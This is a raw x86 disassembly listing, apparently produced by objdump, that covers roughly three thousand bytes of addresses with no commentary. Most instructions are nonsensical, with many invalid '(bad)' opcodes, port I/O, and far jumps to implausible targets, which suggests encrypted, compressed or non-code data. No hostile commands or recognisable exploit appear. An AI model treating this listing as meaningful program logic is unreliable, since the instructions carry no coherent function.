  421c9e:	sub    DWORD PTR ds:0xc9a297fe,esi
  421ca4:	retf   
  421ca5:	ss jmp 0x421d01
  421ca8:	mov    al,ds:0x9d2269ae
  421cad:	cmp    edi,DWORD PTR [edi]
  421caf:	jge    0x421cc9
  421cb1:	xchg   esp,eax
  421cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cb4:	dec    ebx
  421cb5:	in     al,0x7a
  421cb7:	ss bnd ret 
  421cba:	ins    DWORD PTR es:[edi],dx
  421cbb:	cmc    
  421cbc:	mov    bl,0x6
  421cbe:	lea    eax,[esi]
  421cc0:	outs   dx,BYTE PTR ds:[esi]
  421cc2:	retf   
  421cc3:	inc    ecx
  421cc4:	jmp    0x421c57
  421cc6:	mov    ds:0x66ca6a6e,al
  421ccb:	xchg   ebx,eax
  421ccc:	inc    DWORD PTR [ecx]
  421cce:	mov    BYTE PTR [edi],ah
  421cd0:	inc    eax
  421cd1:	xchg   dl,al
  421cd3:	lock test eax,0x904a4112
  421cd9:	sbb    DWORD PTR [ebp+0x2728a46],ecx
  421cdf:	loopne 0x421ce7
  421ce1:	fstp   QWORD PTR [edi-0x74b82d7d]
  421ce7:	mov    eax,ds:0xe60158a1
  421cec:	push   eax
  421ced:	enter  0x460e,0x7d
  421cf1:	mov    ebp,0x533216d1
  421cf6:	cmc    
  421cf7:	adc    esp,DWORD PTR [eax+0x535ed11a]
  421cfd:	push   0x45
  421cff:	fist   WORD PTR [edx-0x17]
  421d02:	fs dec si
  421d05:	sar    DWORD PTR [edi],cl
  421d07:	and    esp,DWORD PTR [eax-0x62]
  421d0a:	test   BYTE PTR [esi],cl
  421d0c:	loop   0x421d16
  421d0e:	lods   eax,DWORD PTR ds:[esi]
  421d0f:	fwait
  421d10:	add    cl,BYTE PTR [ecx]
  421d12:	mov    bh,0xcd
  421d14:	mov    dh,dh
  421d16:	addr16 mov bl,0xff
  421d19:	mov    edx,0xad108239
  421d1e:	xlat   BYTE PTR ds:[ebx]
  421d1f:	and    DWORD PTR [ebp-0x8],ecx
  421d22:	xlat   BYTE PTR ds:[ebx]
  421d23:	cmp    BYTE PTR [esi-0x270e3536],cl
  421d29:	mov    esp,DWORD PTR [ebp+0x6ac8da57]
  421d2f:	mov    bh,0x2e
  421d31:	std    
  421d32:	out    dx,al
  421d33:	sub    al,0xd8
  421d35:	pop    es
  421d36:	outs   dx,BYTE PTR ds:[esi]
  421d37:	daa    
  421d38:	clc    
  421d39:	push   ecx
  421d3a:	mov    al,0x76
  421d3c:	or     ebx,edx
  421d3e:	out    0x46,al
  421d40:	fcom   QWORD PTR [ebx-0x5a44b89]
  421d46:	or     esp,ecx
  421d48:	add    ch,ch
  421d4a:	test   DWORD PTR es:[edi],ebx
  421d4d:	sahf   
  421d4e:	rcl    DWORD PTR [ecx],cl
  421d50:	xchg   ebp,eax
  421d51:	xor    al,0xc0
  421d53:	daa    
  421d54:	and    eax,0x45e4ace7
  421d59:	clc    
  421d5a:	push   edx
  421d5b:	into   
  421d5c:	adc    al,0xed
  421d5e:	fidiv  DWORD PTR [ecx]
  421d60:	fbld   TBYTE PTR [eax-0x7bd9804b]
  421d66:	jo     0x421dad
  421d68:	jle    0x421d42
  421d6a:	pop    esi
  421d6b:	adc    eax,0x4b6b4407
  421d70:	aam    0xec
  421d72:	inc    eax
  421d73:	fwait
  421d74:	out    0x54,al
  421d76:	ror    DWORD PTR [ebx+0x62],cl
  421d79:	push   esp
  421d7a:	dec    esi
  421d7b:	dec    edi
  421d7c:	mov    al,ds:0x44819207
  421d81:	int    0x99
  421d83:	aaa    
  421d84:	into   
  421d85:	fcomp  QWORD PTR [edx+0x10]
  421d88:	dec    esi
  421d89:	fdivr  DWORD PTR [edi-0x2fbd141a]
  421d8f:	sub    bl,BYTE PTR [edx]
  421d91:	add    DWORD PTR [ecx+0x6f],0xffffff8f
  421d95:	fisub  DWORD PTR [ecx+0x40]
  421d98:	mov    ecx,DWORD PTR [ebx+0x30]
  421d9b:	outs   dx,BYTE PTR ds:[esi]
  421d9d:	or     BYTE PTR [ecx+edi*8],bl
  421da0:	lods   eax,DWORD PTR ds:[esi]
  421da1:	or     DWORD PTR [ebp-0x14cbea9b],ebx
  421da7:	jo     0x421daf
  421da9:	call   0x319c:0x5c2e8518
  421db0:	mov    bh,0x67
  421db2:	push   0x70eb7ecb
  421db7:	jns    0x421d88
  421db9:	add    dl,ch
  421dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dbc:	jmp    0xed3c:0x4439673e
  421dc3:	ror    dh,cl
  421dc5:	mov    WORD PTR [ebx],?
  421dc7:	leave  
  421dc8:	fucomip st,st(2)
  421dca:	cmp    ch,0x8c
  421dcd:	mov    eax,ds:0x23e01181
  421dd2:	out    0xb3,al
  421dd4:	or     BYTE PTR ds:0xb1669ec9,ah
  421dda:	cli    
  421ddb:	ret    0xa3ca
  421dde:	xor    eax,0x139dbe16
  421de3:	(bad)  
  421de4:	rol    WORD PTR [eax],1
  421de7:	(bad)  
  421de8:	(bad)  
  421de9:	out    0x84,al
  421deb:	mov    bh,0x4b
  421ded:	adc    BYTE PTR [eax],ah
  421def:	call   0x1977b538
  421df4:	lock repnz sti 
  421df7:	in     eax,dx
  421df8:	jp     0x421dea
  421dfa:	lahf   
  421dfb:	push   ds
  421dfc:	lods   eax,DWORD PTR ds:[esi]
  421dfd:	and    ebp,DWORD PTR [edi+edi*1]
  421e00:	fcmovnbe st,st(0)
  421e02:	xchg   ecx,eax
  421e03:	addr16 retf 
  421e05:	call   DWORD PTR [eax-0x1c]
  421e08:	out    dx,al
  421e09:	imul   edx,DWORD PTR [eax],0xd
  421e0c:	call   0xe3c0a55e
  421e11:	es sub eax,0x13662647
  421e17:	and    bh,dh
  421e19:	mov    edx,0x67db92ee
  421e1e:	mov    esi,0x4c53bd5b
  421e23:	out    dx,eax
  421e24:	jge    0x421dc7
  421e26:	call   0xeede:0x4fb2d496
  421e2d:	inc    ebp
  421e2e:	xor    al,0x41
  421e30:	jb     0x421eac
  421e32:	leave  
  421e33:	in     al,0x33
  421e35:	or     eax,0x3ca9926a
  421e3a:	mov    ds:0x971b5d6d,al
  421e3f:	pop    edi
  421e40:	fist   WORD PTR [esi+0x13d86310]
  421e46:	cmp    ebx,DWORD PTR [ebx+0x636c8e3d]
  421e4c:	mov    cs,ecx
  421e4e:	dec    eax
  421e4f:	lods   al,BYTE PTR ds:[esi]
  421e50:	es inc esi
  421e52:	dec    ebx
  421e53:	and    DWORD PTR [eax+eiz*2+0x64],0x1e205f7b
  421e5b:	sbb    ebp,DWORD PTR [edx-0x31]
  421e5e:	add    al,0x1d
  421e60:	add    BYTE PTR [ebx+edi*1+0x55],ah
  421e64:	clc    
  421e65:	repz push edi
  421e67:	push   esi
  421e68:	cmp    DWORD PTR [ebx],esp
  421e6a:	push   edi
  421e6b:	pop    es
  421e6c:	hlt    
  421e6d:	(bad)
  421e70:	xchg   BYTE PTR [edx+0x37],bl
  421e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e74:	in     eax,dx
  421e75:	inc    eax
  421e76:	mov    dl,0xf7
  421e78:	sbb    eax,0xfb700dbc
  421e7d:	sub    eax,0x8155ec2b
  421e82:	pop    edx
  421e83:	dec    ebp
  421e84:	enter  0x6297,0x66
  421e88:	sbb    eax,0x232fd427
  421e8d:	clc    
  421e8e:	test   al,0x4f
  421e90:	shr    DWORD PTR [ebp+0x30e0b57b],0x1c
  421e97:	fdivr  DWORD PTR [edx-0x4c]
  421e9a:	sbb    eax,0x1121a3f0
  421e9f:	mov    bl,0xfc
  421ea1:	cmp    dl,bl
  421ea3:	rol    BYTE PTR [ecx],1
  421ea5:	xor    al,0x90
  421ea7:	das    
  421ea8:	push   edx
  421ea9:	stc    
  421eaa:	mov    ecx,0x1c716cde
  421eaf:	push   esp
  421eb0:	out    0x3f,al
  421eb2:	jbe    0x421f25
  421eb4:	sar    DWORD PTR [esi+0x9],1
  421eb7:	sbb    ah,BYTE PTR [ebx+0x68]
  421eba:	pop    edi
  421ebb:	sbb    eax,0x1bea7a98
  421ec0:	mov    ebp,0xde185d94
  421ec5:	sbb    esp,ecx
  421ec7:	int    0x51
  421ec9:	inc    edx
  421eca:	out    dx,eax
  421ecb:	sub    BYTE PTR [edi-0x1ea980d5],dl
  421ed1:	pop    edx
  421ed2:	imul   ebx,DWORD PTR [esi],0x1b
  421ed5:	jle    0x421f49
  421ed7:	xchg   esp,eax
  421ed8:	mov    dh,0xba
  421eda:	cmp    esp,DWORD PTR [ecx+0x5b]
  421edd:	test   bl,bl
  421edf:	dec    esi
  421ee0:	movzx  esp,WORD PTR [edi]
  421ee3:	jle    0x421f21
  421ee5:	sar    al,1
  421ee7:	(bad)  
  421ee8:	(bad)  
  421ee9:	iret   
  421eea:	inc    ebx
  421eeb:	and    ebx,edx
  421eed:	gs pusha 
  421eef:	stc    
  421ef0:	xchg   DWORD PTR [ebp+eiz*1+0x3],esi
  421ef4:	aam    0x17
  421ef6:	fidiv  WORD PTR [edx+0x3f]
  421ef9:	in     eax,0xca
  421efb:	add    BYTE PTR ds:0x49702819,0xe7
  421f02:	stos   DWORD PTR es:[edi],eax
  421f03:	not    esp
  421f05:	shl    DWORD PTR [ecx+0x5c6b1d6d],cl
  421f0b:	out    dx,al
  421f0c:	jp     0x421eb1
  421f0e:	xacquire xchg DWORD PTR [esi],edx
  421f11:	xchg   ah,ah
  421f13:	cmp    eax,0xe5896d97
  421f18:	jecxz  0x421ea9
  421f1a:	xor    edx,DWORD PTR [edi-0x58d73e88]
  421f20:	push   ss
  421f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f22:	cs ja  0x421f78
  421f25:	mov    bh,0x15
  421f27:	std    
  421f28:	mov    ebx,0x853f255d
  421f2d:	jge    0x421f5b
  421f2f:	call   0xa5ec781d
  421f34:	fnsave [edx]
  421f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f37:	mov    ebp,0xe7e43bfb
  421f3c:	mov    bl,0xb6
  421f3e:	mov    bh,0xcc
  421f40:	and    BYTE PTR [eax],ah
  421f42:	mov    al,ds:0x47ce2e37
  421f47:	pop    edi
  421f48:	xchg   DWORD PTR [ebp-0x45527d7a],esp
  421f4e:	shl    DWORD PTR [eax+edx*1],0x4f
  421f52:	adc    bh,al
  421f54:	inc    ecx
  421f55:	jae    0x421f2a
  421f57:	iret   
  421f58:	adc    edx,esi
  421f5a:	mov    ebx,0xadaf3bd6
  421f5f:	test   al,0x91
  421f61:	inc    esp
  421f62:	xchg   ecx,eax
  421f63:	jg     0x421fd7
  421f65:	mov    ch,0xda
  421f67:	ins    BYTE PTR es:[edi],dx
  421f68:	push   esi
  421f69:	in     eax,dx
  421f6a:	aam    0xf4
  421f6c:	mov    esi,0xd796b999
  421f71:	ret    0x8fd7
  421f74:	icebp  
  421f75:	or     al,0xdb
  421f77:	xchg   esp,eax
  421f78:	outs   dx,BYTE PTR ds:[esi]
  421f79:	outs   dx,DWORD PTR ds:[esi]
  421f7a:	(bad)  
  421f7c:	stos   DWORD PTR es:[edi],eax
  421f7d:	mov    BYTE PTR [edx-0x30],ch
  421f80:	xor    DWORD PTR [edi-0x5b81919a],ecx
  421f86:	add    DWORD PTR [esi-0x6f191266],edx
  421f8c:	out    0xd0,eax
  421f8e:	pop    ds
  421f8f:	push   ss
  421f90:	scas   eax,DWORD PTR es:[edi]
  421f91:	xchg   ebp,eax
  421f92:	xchg   esp,eax
  421f93:	inc    edx
  421f94:	repnz push ebp
  421f96:	nop
  421f97:	push   ds
  421f98:	mov    ds:0x16c187f9,al
  421f9d:	fld    st(7)
  421f9f:	sub    BYTE PTR [ecx],dh
  421fa1:	fmul   DWORD PTR [eax-0x73]
  421fa4:	lock push 0x49
  421fa7:	loope  0x421f30
  421fa9:	cmp    BYTE PTR [esi-0x51a70eb9],dh
  421faf:	ret    
  421fb0:	das    
  421fb1:	bnd ret 0x9a20
  421fb5:	jbe    0x421ff5
  421fb7:	mov    ch,0x6b
  421fb9:	ins    DWORD PTR es:[edi],dx
  421fba:	aam    0xc9
  421fbc:	cmp    DWORD PTR es:[edx-0x72],0xffffff8f
  421fc1:	mov    cl,0x84
  421fc3:	stos   DWORD PTR es:[edi],eax
  421fc4:	jge    0x421ff7
  421fc6:	pop    ecx
  421fc7:	or     al,0x6e
  421fc9:	and    eax,0xbd47438f
  421fce:	push   ecx
  421fcf:	cmp    esi,DWORD PTR [ecx+0x3b4a0c51]
  421fd5:	jo     0x421f80
  421fd7:	aam    0x80
  421fd9:	call   0xb66db153
  421fde:	dec    edx
  421fdf:	adc    eax,0x12170188
  421fe4:	in     al,0x10
  421fe6:	out    0x5d,al
  421fe8:	sub    al,0x48
  421fea:	ja     0x422011
  421fec:	cmp    BYTE PTR [esi+0x410bb72c],ah
  421ff2:	push   ecx
  421ff3:	je     0x422009
  421ff5:	xor    eax,DWORD PTR ds:0x8b75fd79
  421ffb:	xor    al,0x26
  421ffd:	(bad)  
  421ffe:	enter  0x6093,0x70
  422002:	nop
  422003:	adc    eax,0x5f7b1a37
  422008:	push   ss
  422009:	iret   
  42200a:	mov    eax,ds:0xcf86c9a5
  42200f:	mov    cl,0x47
  422011:	inc    ebp
  422012:	pop    eax
  422013:	test   BYTE PTR [edi-0x542d2391],dl
  422019:	shr    BYTE PTR [esp+ebp*4-0x62],1
  42201d:	cmp    ecx,DWORD PTR [ebp+0x6fa2b55f]
  422023:	fs xchg edx,eax
  422025:	inc    eax
  422026:	xchg   edi,eax
  422027:	dec    ecx
  422028:	or     ecx,ebp
  42202a:	sbb    al,0x69
  42202c:	stos   BYTE PTR es:[edi],al
  42202d:	or     ebp,0x2021ce5a
  422033:	or     al,0x66
  422035:	xor    cl,BYTE PTR [ecx+0x756bd008]
  42203b:	in     eax,dx
  42203c:	cwde   
  42203d:	shr    BYTE PTR ds:0xaab5e4f5,0xe4
  422044:	push   0xa30568b7
  422049:	int    0xe5
  42204b:	enter  0xcefa,0x80
  42204f:	xor    eax,DWORD PTR [ebp-0x7]
  422052:	repz loopne 0x421fdd
  422055:	xrelease mov DWORD PTR [esi],ebx
  422058:	push   ecx
  422059:	test   DWORD PTR [eax-0x2a],esp
  42205c:	sub    DWORD PTR [eax+0x6],0x95432ff2
  422063:	int3   
  422064:	jno    0x42205c
  422066:	xor    BYTE PTR [ebx+0x6d],bl
  422069:	sbb    eax,0xd2db119e
  42206e:	mov    cl,0x28
  422070:	imul   esi,eax,0x64e1404b
  422076:	inc    ebp
  422077:	sbb    edi,ecx
  422079:	mov    ds:0x935ec509,eax
  42207e:	(bad)
  422082:	sbb    al,0xf9
  422084:	addr16 ffreep st(0)
  422087:	cwde   
  422088:	sti    
  422089:	sub    eax,0xdb4b32ff
  42208e:	jbe    0x4220bc
  422090:	add    ecx,DWORD PTR [ebx-0x3f]
  422093:	outs   dx,DWORD PTR ds:[esi]
  422094:	shl    ch,1
  422096:	xchg   BYTE PTR [edi+eax*1],al
  422099:	fmul   QWORD PTR [esi]
  42209b:	and    al,0xc8
  42209d:	xchg   ecx,eax
  42209e:	xchg   DWORD PTR [esp+ecx*4],esp
  4220a1:	adc    BYTE PTR [ebx],cl
  4220a3:	mov    dh,0x46
  4220a5:	mul    BYTE PTR [ebp+ecx*4-0x7b6cfa97]
  4220ac:	jmp    0xf0ff:0x9f9bf25f
  4220b3:	out    dx,eax
  4220b4:	js     0x4220c6
  4220b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220b7:	or     dl,BYTE PTR [ebp-0x45]
  4220ba:	jae    0x422059
  4220bc:	sub    esi,DWORD PTR [esp+edx*4-0x5]
  4220c0:	sub    eax,0xf72901d8
  4220c5:	jle    0x422137
  4220c7:	(bad)  
  4220c8:	nop
  4220c9:	mov    dl,0xe3
  4220cb:	fdiv   QWORD PTR [ecx]
  4220cd:	stos   DWORD PTR es:[edi],eax
  4220ce:	clc    
  4220cf:	repnz lods eax,DWORD PTR ds:[esi]
  4220d1:	data16 or bh,ah
  4220d4:	gs daa 
  4220d6:	xchg   ebx,eax
  4220d7:	icebp  
  4220d8:	push   eax
  4220d9:	std    
  4220da:	xor    cl,BYTE PTR [ebx]
  4220dc:	jge    0x42211d
  4220de:	int3   
  4220df:	pushf  
  4220e0:	stos   DWORD PTR es:[edi],eax
  4220e1:	pusha  
  4220e2:	sbb    eax,0x188b6895
  4220e7:	push   ss
  4220e8:	cdq    
  4220e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220ea:	xor    al,0x2b
  4220ec:	ins    DWORD PTR es:[edi],dx
  4220ed:	jo     0x422073
  4220ef:	mov    cl,0xda
  4220f1:	mov    ah,0xe4
  4220f3:	stc    
  4220f4:	xor    bl,BYTE PTR es:[ebx-0x3]
  4220f8:	(bad)  
  4220f9:	jle    0x42209f
  4220fb:	stc    
  4220fc:	sub    DWORD PTR [edx+0x349662cd],edi
  422102:	fdiv   DWORD PTR [eax+0xd81978f]
  422108:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422109:	sub    dh,dl
  42210b:	scas   eax,DWORD PTR es:[edi]
  42210c:	cmp    dl,dh
  42210e:	xchg   esi,eax
  42210f:	jmp    0xa15f:0x46993a45
  422116:	mov    esi,DWORD PTR [esi+0x37580500]
  42211c:	ss jp  0x422153
  42211f:	xchg   edx,eax
  422120:	(bad)  
  422121:	shl    BYTE PTR [ecx-0x1cb66e77],1
  422127:	retf   0x671
  42212a:	pop    ss
  42212b:	push   es
  42212c:	das    
  42212d:	fs seta cl
  422131:	loope  0x422179
  422133:	cs loope 0x422134
  422136:	sbb    DWORD PTR [edx-0x11],esp
  422139:	dec    ecx
  42213a:	ds jmp 0x7991:0x49b079f4
  422142:	push   esi
  422143:	dec    edx
  422144:	inc    ah
  422146:	call   eax
  422148:	mov    BYTE PTR ds:0x90828c9,al
  42214e:	test   al,0xc6
  422150:	mov    WORD PTR [eax+0x74],?
  422153:	sub    DWORD PTR [ebx],edx
  422155:	jmp    0xeba6274f
  42215a:	mov    eax,ds:0x2aa608af
  42215f:	bound  edx,QWORD PTR [ebp-0x137bc600]
  422165:	jnp    0x4221cc
  422167:	(bad)  
  422168:	(bad)  
  422169:	aas    
  42216a:	jae    0x422191
  42216c:	lahf   
  42216d:	inc    ebx
  42216e:	call   0xcfde9539
  422173:	mov    al,0xf7
  422175:	jno    0x422137
  422177:	sbb    eax,DWORD PTR [esp+edx*4]
  42217a:	jns    0x4221ea
  42217c:	call   FWORD PTR [eax+edx*1]
  42217f:	xor    DWORD PTR [esi+0x3c],ecx
  422182:	inc    ebp
  422183:	sub    eax,0x11ffdeb8
  422188:	(bad)  
  422189:	push   cs
  42218a:	pushf  
  42218b:	enter  0xc30d,0x2
  42218f:	scas   al,BYTE PTR es:[edi]
  422190:	pop    edx
  422191:	popf   
  422192:	sbb    DWORD PTR [ebp-0x20],esp
  422195:	fcmovnbe st,st(2)
  422197:	jecxz  0x4221f9
  422199:	add    DWORD PTR [ecx+ebp*4+0x76a43b1b],0xa212d54b
  4221a4:	enter  0x8090,0xed
  4221a8:	fwait
  4221a9:	xor    ch,BYTE PTR [ebx+ebx*4]
  4221ac:	int    0x8a
  4221ae:	pop    edx
  4221af:	sbb    BYTE PTR [edx-0xa980af],ch
  4221b5:	loopne 0x42216d
  4221b7:	xor    BYTE PTR [edx-0x2a],bl
  4221ba:	pop    ds
  4221bb:	cmp    al,0x8d
  4221bd:	push   cs
  4221be:	dec    BYTE PTR [eax+ecx*1+0x140684cb]
  4221c5:	es lahf 
  4221c7:	in     al,dx
  4221c8:	pop    ecx
  4221c9:	iret   
  4221ca:	test   eax,0x6cf52fa5
  4221cf:	(bad)  
  4221d0:	xor    cl,dh
  4221d2:	loopne 0x42218c
  4221d4:	adc    eax,0xc273ed3
  4221d9:	stos   BYTE PTR es:[edi],al
  4221da:	sbb    eax,0x97399b2a
  4221df:	add    dh,BYTE PTR [edi]
  4221e1:	retf   0xd225
  4221e4:	es scas al,BYTE PTR es:[edi]
  4221e6:	add    DWORD PTR [edx-0x3c048cf6],edi
  4221ec:	(bad)  
  4221ed:	xor    eax,0x47d12b7
  4221f2:	lea    esp,[edx-0x4e]
  4221f5:	popf   
  4221f6:	es mov eax,0x7b0f07f0
  4221fc:	ss inc esp
  4221fe:	sti    
  4221ff:	mov    esi,DWORD PTR [ebx-0x74bb0ac3]
  422205:	push   0x7c
  422207:	test   ecx,ecx
  422209:	mov    dl,0x90
  42220b:	(bad)  
  42220c:	(bad)  [edx+0x693f0318]
  422212:	add    eax,0x156cd5fa
  422217:	push   ss
  422218:	mov    edx,0xd5e21090
  42221d:	mov    edi,0xac924bf6
  422222:	arpl   WORD PTR [esi],cx
  422224:	(bad)  
  422225:	or     edx,DWORD PTR [eax-0x2f]
  422228:	sub    DWORD PTR [edx],ecx
  42222a:	mov    al,ds:0x3b019d9e
  42222f:	fs ret 0x20b6
  422233:	fdivr  st,st(5)
  422235:	mov    bh,0x99
  422237:	dec    ebx
  422238:	test   DWORD PTR [ecx+0x8],ecx
  42223b:	test   al,0x5e
  42223d:	sti    
  42223e:	jns    0x422259
  422240:	in     al,0xa5
  422242:	mov    ebx,0x30837acc
  422247:	pop    eax
  422248:	dec    eax
  422249:	data16 sub al,0x97
  42224c:	push   es
  42224d:	(bad)  
  42224e:	leave  
  42224f:	inc    ebx
  422250:	or     al,0x6c
  422252:	rol    edx,1
  422254:	xchg   edx,eax
  422255:	mov    edx,0x86831070
  42225a:	int3   
  42225b:	retf   
  42225c:	inc    esp
  42225d:	aas    
  42225e:	jp     0x42225c
  422260:	pop    edx
  422261:	dec    ebx
  422262:	adc    al,0x47
  422264:	push   edx
  422265:	bound  esp,QWORD PTR [ebx+0x43]
  422268:	add    DWORD PTR [edx+0x14],ecx
  42226b:	mov    bl,0xb9
  42226d:	outs   dx,DWORD PTR ds:[esi]
  42226e:	pop    ecx
  42226f:	aad    0xda
  422271:	lods   al,BYTE PTR ds:[esi]
  422272:	outs   dx,DWORD PTR ds:[esi]
  422273:	pushf  
  422274:	(bad)  
  422275:	fcomp  DWORD PTR [ebx]
  422277:	mov    ds:0xa37cae55,al
  42227c:	lods   eax,DWORD PTR ds:[esi]
  42227d:	das    
  42227e:	rcl    BYTE PTR [ebp-0x6d248a54],cl
  422284:	push   ds
  422285:	add    dh,BYTE PTR [edi-0x60]
  422288:	push   edi
  422289:	pop    ebx
  42228a:	pop    eax
  42228b:	adc    DWORD PTR [esi-0x14b3db22],esi
  422291:	arpl   dx,cx
  422293:	aas    
  422294:	pop    edi
  422295:	mov    al,0x6b
  422297:	stc    
  422298:	icebp  
  422299:	mov    ds:0xe32bf08,al
  42229e:	ss jns 0x4222d3
  4222a1:	xchg   ebp,eax
  4222a2:	sar    DWORD PTR [ecx+0x27],0x60
  4222a6:	(bad)  
  4222a7:	mov    ebp,0xbd99b8b6
  4222ac:	(bad)  
  4222ad:	lahf   
  4222ae:	cmp    al,0x8b
  4222b0:	and    BYTE PTR [esi+0x5f5f6e03],0x92
  4222b7:	or     BYTE PTR [edi],0xe4
  4222ba:	xchg   ecx,eax
  4222bb:	xchg   ebx,eax
  4222bc:	ds and eax,0x50d4a46a
  4222c2:	jbe    0x4222dd
  4222c4:	popa   
  4222c5:	mov    dl,0x3e
  4222c7:	dec    eax
  4222c8:	mov    bh,0x43
  4222ca:	or     al,0x4d
  4222cc:	add    eax,0xecdcc5a1
  4222d1:	add    DWORD PTR [edi+0x4135c324],esi
  4222d7:	and    ch,bl
  4222d9:	mov    ?,eax
  4222db:	or     eax,0xd242d91
  4222e0:	and    eax,0x5b22a7af
  4222e5:	out    dx,al
  4222e6:	mov    bh,0xe2
  4222e8:	ret    
  4222e9:	scas   eax,DWORD PTR es:[edi]
  4222ea:	daa    
  4222eb:	or     BYTE PTR [eax+0x41],0x41
  4222ef:	das    
  4222f0:	int3   
  4222f1:	mov    eax,ds:0x351fd113
  4222f6:	push   es
  4222f7:	data16 or cl,ah
  4222fa:	or     bl,bh
  4222fc:	sbb    BYTE PTR [ecx-0x68],ch
  4222ff:	pop    ebx
  422300:	adc    edx,DWORD PTR [esi-0x55]
  422303:	fisub  DWORD PTR [ebx-0x58f5052c]
  422309:	les    edi,FWORD PTR [esi+0x3d]
  42230c:	inc    edi
  42230d:	pushf  
  42230e:	push   ebx
  42230f:	int3   
  422310:	xor    BYTE PTR [edi+esi*2],ah
  422313:	imul   esp,DWORD PTR [eax],0x1
  422316:	jnp    0x422376
  422318:	jns    0x42229d
  42231a:	(bad)  
  42231b:	ds imul ebp,eax,0xfffffff8
  42231f:	and    bh,dh
  422321:	outs   dx,DWORD PTR ds:[esi]
  422322:	int    0x85
  422324:	and    bl,BYTE PTR [ebx]
  422326:	lods   eax,DWORD PTR ds:[esi]
  422327:	stc    
  422328:	call   0xd93:0xd1de0cb0
  42232f:	and    bh,0xc0
  422332:	xor    al,0xfb
  422334:	mov    dh,0x3b
  422337:	leave  
  422338:	inc    edx
  422339:	inc    edx
  42233a:	inc    ebx
  42233b:	fwait
  42233c:	sbb    al,0x3e
  42233e:	fcmovne st,st(0)
  422340:	loope  0x42238c
  422342:	call   0xa55f:0x370fd363
  422349:	adc    al,0xe
  42234b:	aam    0xd9
  42234d:	xchg   edi,eax
  42234e:	imul   esp,ebx,0x1fd0cd11
  422354:	or     al,BYTE PTR [esi+ecx*2+0x27c1d71d]
  42235b:	ds loope 0x42231c
  42235e:	dec    ebp
  42235f:	and    eax,0xd235ec1d
  422364:	test   BYTE PTR [ebx-0x4f],ah
  422367:	sbb    BYTE PTR [edx+0x12277d04],dl
  42236d:	or     edx,DWORD PTR ds:0x7f210677
  422373:	push   es
  422374:	test   esi,ebp
  422376:	push   cs
  422377:	int3   
  422378:	pop    esp
  422379:	ja     0x4223c5
  42237b:	xor    eax,ebx
  42237d:	les    ecx,FWORD PTR [ebx-0x5d4f3667]
  422383:	(bad)  
  422384:	dec    eax
  422385:	dec    ebx
  422386:	ss push esi
  422388:	sbb    eax,ecx
  42238a:	pop    eax
  42238b:	out    dx,eax
  42238c:	popf   
  42238d:	fidiv  WORD PTR [edx]
  42238f:	dec    esi
  422390:	(bad)  
  422392:	xor    DWORD PTR [esp+eax*8],ebx
  422395:	push   ebx
  422396:	sbb    cl,dl
  422398:	lods   eax,DWORD PTR ds:[esi]
  422399:	test   eax,0xd6189ac1
  42239e:	sub    edi,DWORD PTR [edi]
  4223a0:	(bad)  
  4223a2:	lds    edx,FWORD PTR [ebp+0x1587b95c]
  4223a8:	adc    eax,0x18ec1b3d
  4223ad:	hlt    
  4223ae:	push   ebx
  4223af:	or     edi,eax
  4223b1:	(bad)  
  4223b2:	ds inc esp
  4223b4:	jae    0x42233e
  4223b6:	in     al,0x34
  4223b8:	xor    ebp,esi
  4223ba:	std    
  4223bb:	pushf  
  4223bc:	push   0x8c440f89
  4223c1:	repnz clc 
  4223c3:	jge    0x4223f2
  4223c5:	mov    dl,0x3
  4223c7:	test   eax,0x3de191a
  4223cc:	stos   BYTE PTR es:[edi],al
  4223cd:	add    dl,BYTE PTR [edx+ebp*4-0x6ec1b6d5]
  4223d4:	les    ecx,FWORD PTR [edx+0x5f]
  4223d7:	call   0xa1ceda9a
  4223dc:	rcr    DWORD PTR [eax+0x21],cl
  4223df:	fiadd  DWORD PTR [edi+0x1c718042]
  4223e5:	mov    edi,0x4e05367c
  4223ea:	adc    BYTE PTR [ecx-0x2c],ch
  4223ed:	pop    edx
  4223ee:	jl     0x422402
  4223f0:	adc    ecx,DWORD PTR [ecx-0x112c8058]
  4223f6:	stc    
  4223f7:	jmp    DWORD PTR [ebx+ecx*2+0x66580cb2]
  4223fe:	jge    0x4223fa
  422400:	jo     0x422455
  422402:	shl    DWORD PTR [ebp+0x1e],cl
  422405:	repz repz cmp edx,DWORD PTR [ebx-0x3]
  42240a:	add    BYTE PTR [esi],bl
  42240c:	and    al,0x50
  42240e:	in     eax,0x34
  422410:	xchg   BYTE PTR [ebx],dl
  422412:	push   edi
  422413:	and    al,0x9e
  422415:	lock fdivrp st(3),st
  422418:	aaa    
  422419:	sar    BYTE PTR [ebx-0x10],0x92
  42241d:	rcr    eax,0x54
  422420:	sbb    eax,0x1d805f1d
  422425:	mov    ecx,0x24091606
  42242a:	cmp    DWORD PTR [ecx-0x23],edx
  42242d:	(bad)  [ebx+0x6a]
  422430:	mov    esp,0x8eeca54c
  422435:	mov    ds:0x80473748,eax
  42243a:	test   al,0xf3
  42243c:	sub    BYTE PTR [edi+0x60],al
  42243f:	(bad)  
  422440:	out    0xaa,al
  422442:	mov    WORD PTR [ecx-0xe8c4c72],?
  422448:	test   bh,dh
  42244a:	pop    eax
  42244b:	or     al,0xc0
  42244d:	sbb    eax,0x149cec94
  422452:	gs mov esi,0x134c5093
  422458:	sahf   
  422459:	mov    eax,gs:0xb9c2bef9
  42245f:	loop   0x4223ec
  422461:	jbe    0x4224e1
  422463:	and    al,0x45
  422465:	loopne 0x42247e
  422467:	loopne 0x4224ce
  422469:	pop    esi
  42246a:	lock inc edx
  42246c:	dec    edi
  42246d:	mov    bh,0x4d
  42246f:	jmp    0x4e8c8739
  422474:	xchg   esi,eax
  422475:	and    al,0x1e
  422477:	outs   dx,DWORD PTR ds:[esi]
  422478:	add    al,0x7e
  42247a:	(bad)  
  42247b:	lahf   
  42247c:	and    BYTE PTR [esi],dh
  42247e:	mov    cl,0x5d
  422480:	add    ebx,ecx
  422482:	in     al,dx
  422483:	cdq    
  422484:	xchg   edx,eax
